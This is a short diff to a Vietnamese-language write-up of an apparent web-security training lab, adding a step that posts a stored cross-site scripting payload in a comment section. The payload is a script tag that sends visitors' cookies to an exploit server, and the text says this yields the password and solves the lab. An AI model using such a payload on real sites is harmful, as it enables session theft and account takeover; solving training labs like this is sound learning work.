@@ -8,4 +8,7 @@
 * <img width="801" height="581" alt="image" src="https://github.com/user-attachments/assets/e31241e7-0940-434a-9c9c-1495f95f7bdb" />
 * <img width="558" height="219" alt="image" src="https://github.com/user-attachments/assets/c025fc2c-13fb-43ba-a938-8db7706ed927" />
 * Trang này cũng có 1 trang bình luận và có vẻ test payload ở đây thì nó đã hoạt động.
-* 
+* <script>document.location="https://exploit-0a46001e03a3b2bb80e402f701aa0057.exploit-server.net"+document.cookie</script>
+* Thêm payload này vào và đến máy chủ khai thác ra sẽ có được mật khẩu
+* <img width="1379" height="178" alt="image" src="https://github.com/user-attachments/assets/e74531a4-6433-4b2d-80f0-253ba7aa5384" />
+* Và ta đã giải được bài này
